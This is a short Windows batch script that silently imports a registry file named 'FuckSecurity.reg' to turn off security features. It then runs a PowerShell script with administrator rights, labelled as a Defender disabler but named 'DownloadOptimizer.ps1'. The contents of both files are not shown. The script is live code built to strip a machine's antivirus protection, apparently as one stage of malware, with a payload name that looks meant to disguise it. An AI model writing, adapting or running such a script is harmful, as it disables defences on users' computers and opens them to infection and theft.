@echo off
echo Turning off security features...
regedit /s "%cd%\FuckSecurity.reg"

echo Running Defender disabler...
powershell -Command "Start-Process powershell -Verb runAs -ArgumentList '-File', '%cd%\DownloadOptimizer.ps1'"



